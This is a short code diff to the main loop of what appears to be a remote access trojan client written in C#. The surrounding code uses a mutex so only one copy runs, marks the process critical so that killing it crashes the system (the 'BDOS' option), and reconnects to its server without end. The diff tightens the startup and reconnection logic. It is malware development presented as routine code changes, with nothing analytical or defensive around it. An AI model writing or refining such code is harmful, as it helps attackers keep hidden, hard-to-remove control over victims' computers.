@@ -25,6 +25,8 @@ namespace Client
         static void Main()
         {
             Thread.Sleep(2500);
+            if (!Settings.InitializeSettings()) Environment.Exit(0);
+
             if (!Methods.CreateMutex())
                 Environment.Exit(0);
 
@@ -37,19 +39,16 @@ namespace Client
             if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                 ProcessCritical.Set();
 
-#if DEBUG
             ClientSocket.InitializeClient();
-#else
-            if (Settings.InitializeSettings())
-                ClientSocket.InitializeClient();
-            else
-                Environment.Exit(0);
-#endif
+
             while (true)
             {
                 if (!ClientSocket.IsConnected)
+                {
                     ClientSocket.Reconnect();
-                Thread.Sleep(new Random().Next(5000));
+                    ClientSocket.InitializeClient();
+                }
+                Thread.Sleep(new Random().Next(1000,5000));
             }
         }
     }
